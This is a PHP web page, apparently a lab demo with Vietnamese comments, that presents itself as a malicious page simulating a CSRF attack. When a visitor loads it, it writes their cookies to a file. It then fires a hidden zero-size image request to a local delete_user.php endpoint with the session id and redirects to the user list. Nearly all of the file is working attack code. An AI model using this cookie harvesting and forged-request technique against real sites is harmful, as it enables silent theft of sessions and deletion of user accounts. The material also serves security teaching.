<?php
session_start();

// Lưu cookie (nếu cần)
file_put_contents('cookie.txt', json_encode($_COOKIE), FILE_APPEND | LOCK_EX);

// Hiển thị ID phiên (không bắt buộc)
if (isset($_SESSION['id'])) {
    echo 'ID phiên đăng nhập hiện tại: ' . htmlspecialchars($_SESSION['id']) . '<br>';
}
?>
<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="UTF-8">
    <title>Hacker</title>
</head>

<body>
    <h1>Trang web giả mạo</h1>
    <p>Đây là một trang web độc hại giả lập cuộc tấn công CSRF.</p>
    <!-- Tấn công xóa user -->
    <?php if (isset($_SESSION['id'])) { ?>
        <img src="http://localhost:8080/delete_user.php?id=<?php echo htmlspecialchars($_SESSION['id']); ?>" height="0"
            width="0">
    <?php } ?>
    <script>
        window.location.href = "http://localhost:8080/list_users.php";
    </script>
</body>

</html>